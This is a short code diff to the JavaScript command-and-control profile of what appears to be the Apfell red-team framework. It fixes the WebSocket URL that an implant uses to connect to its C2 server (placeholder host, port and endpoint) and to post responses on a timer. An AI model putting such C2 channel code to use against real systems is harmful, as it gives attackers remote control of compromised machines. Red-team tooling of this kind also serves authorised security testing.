@@ -16,7 +16,7 @@ class customC2 extends baseC2{
             this.proto = 'ws://';
         }
 
-        this.server = `${this.proto}${this.host}${this.port}/${this.endpoint}`;
+        this.server = `${this.proto}${this.host}:${this.port}/${this.endpoint}`;
     }
 
     getConfig() {
@@ -71,8 +71,7 @@ function CreateApfellMessage(type, apfellID, uuid, size, taskid, tasktype, data)
 
 //------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
 const C2 = new customC2('HOST_REPLACE',  PORT_REPLACE, 'ENDPOINT_REPLACE', SSL_REPLACE, INTERVAL_REPLACE);
-let server = C2.server;
-const connection  = new WebSocket(`${server}`);
+const connection  = new WebSocket(`${C2.server}`);
 
 setInterval(function(){
     C2.postResponse();
